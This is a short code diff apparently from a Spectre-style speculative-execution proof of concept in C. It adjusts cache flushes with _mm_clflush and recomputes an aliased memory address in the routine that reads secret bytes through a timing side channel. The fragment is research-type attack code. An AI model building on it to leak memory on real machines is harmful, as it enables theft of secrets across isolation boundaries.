@@ -233,8 +233,8 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
         x = training_x ^ (x & (malicious_x ^ training_x));
 
         _mm_clflush( & array1_size);
-        _mm_clflush( (void*)& dropbag);
-        //_mm_clflush( (void*)(alias));
+        //_mm_clflush( (void*)& dropbag);
+        //_mm_clflush( (void*)(malicious_alias));
 
         /* Delay (can also mfence) */
         for (volatile int z = 0; z < 100; z++) {}
@@ -351,10 +351,10 @@ int main(int argc,
   }
   #endif
 
-  uint64_t alias_base = ((uint64_t)big_block) & (uint64_t)(~0x2fff);
-  alias_base = 0;
-  alias = (int32_t*)((((uint64_t)&dropbag) & 0x2fff) + alias_base);
-  //alias = &dropbag;
+  //uint64_t alias_base = ((uint64_t)big_block) & (uint64_t)(~0x2fff);
+  //uint64_t alias_base = ((uint64_t)(&score)) & (uint64_t)(~0x2fff);
+  uint64_t alias_base = (uint64_t)malloc(0x8000) & ~0x2fff;
+  alias = (int32_t*)((((uint64_t)&dropbag) & 0x2fff) + alias_base) + 0x1000;
   printf("dropbag: %p\n  alias: %p\n", &dropbag, alias);
 
   for (i = 0; i < (int)sizeof(array2); i++) {
